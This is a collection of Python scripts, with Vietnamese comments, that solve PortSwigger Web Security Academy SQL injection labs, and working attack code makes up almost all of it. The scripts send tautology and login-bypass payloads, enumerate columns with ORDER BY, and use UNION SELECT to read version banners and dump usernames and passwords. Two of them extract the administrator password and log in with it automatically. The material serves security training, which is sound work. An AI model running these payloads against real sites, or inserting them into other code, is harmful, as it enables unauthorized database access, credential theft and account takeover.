# LAB 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```python
import requests
print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
target_url = f"{url}/filter?category=Gifts'+OR+1=1+--"

response = requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 2: SQL injection vulnerability allowing login bypass
- Em không có hiểu cái cách lấy CSRF nên e dùng chatGPT để làm cái đoạn đó ạ 🥲
```python
import requests
from bs4 import BeautifulSoup

url = input("Nhập URL: ").rstrip("/")
login_url = f"{url}/login"

session = requests.Session()
response = session.get(login_url)

if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "admin' OR 1=1--",
    "password": "a"
}

response = session.post(login_url, data=data)
print(f"Request sent to: {login_url}")
if (response.status_code == 200):
    print("Login successful!")
else:
    print("Login failed!")
```

# LAB 3: SQL injection UNION attack, determining the number of columns returned by the query
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")


i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

null_values = ",+".join(["NULL"] * i)
union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"

print(f"Payload UNION: {union_url}")
response = requests.get(union_url)

if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

# LAB 4: SQL injection UNION attack, finding a column containing text
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
print("Ví dụ: Giá trị được lab cung cấp: aNjdF")
value = input("Giá trị được lab cung cấp: ")

i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1  
    else:
        i -= 1  
        break

for pos in range(i):
    test_values = ["NULL"] * i  
    test_values[pos] = f"'{value}'"  

    null_values = ",+".join(test_values)
    union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{null_values}--"
    
    print(f"Thử payload: {union_url}")
    response = requests.get(union_url)
    
    if response.status_code == 200:
        print("Successful")
        break 
```

# LAB 5: SQL injection UNION attack, retrieving data from other tables
```python
import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password_found = None
    for row in table_rows:
        th = row.find("th")
        td = row.find("td")
        if th and td and th.text.strip() == "administrator":
            password_found = td.text.strip()
            break

    if password_found:
        print(f"Tìm thấy password của administrator: {password_found}")
    else:
        print("Không tìm thấy password")
        exit()
else:
    print("Lỗi")
    exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password_found
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")
```

# LAB 6: SQL injection UNION attack, retrieving multiple values in a single column
```python
import requests
from bs4 import BeautifulSoup

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+NULL,username||':'||password+FROM+users--"
print(f"Thử payload: {union_url}")

response = requests.get(union_url)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password_found = None
    for row in table_rows:
        th = row.find("th")
        if th:
            content = th.text.strip()
            if content.startswith("administrator:"):
                password_found = content.split(":", 1)[1]
                break


    if password_found:
        print(f"Tìm thấy password của administrator: {password_found}")
    else:
        print("Không tìm thấy password")
        exit()
else:
    print("Lỗi")
    exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password_found
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")
```

# LAB 7: SQL injection attack, querying the database type and version on MySQL and Microsoft
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    order_url = f"{url}/filter?category=Accessories'+ORDER+BY+{i}+%23"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break

null_values = ",+".join(["NULL"] * (i - 1))
union_url = f"{url}/filter?category=Accessories'+UNION+SELECT+@@version,+{null_values}+%23"

print(f"Thử payload: {union_url}")
response = requests.get(union_url)

if response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")
```

# LAB 7.5: SQL injection attack, querying the database type and version on Oracle
```python
import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    order_url = f"{url}/filter?category=Accessories'+ORDER+BY+{i}+--"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break
        
if i == 0:
    union_url = f"{url}/filter?category=Accessories'+UNION+SELECT+banner+FROM+v$version+--"
else:
    null_values = ",+".join(["NULL"] * (i - 1))
    union_url = f"{url}/filter?category=Accessories'+UNION+SELECT+banner,+{null_values}+FROM+v$version+--"

print(f"Thử payload: {union_url}")
response = requests.get(union_url)

if response.status_code == 200:
    print("Successful!")
else:
    print("Failed!")
```
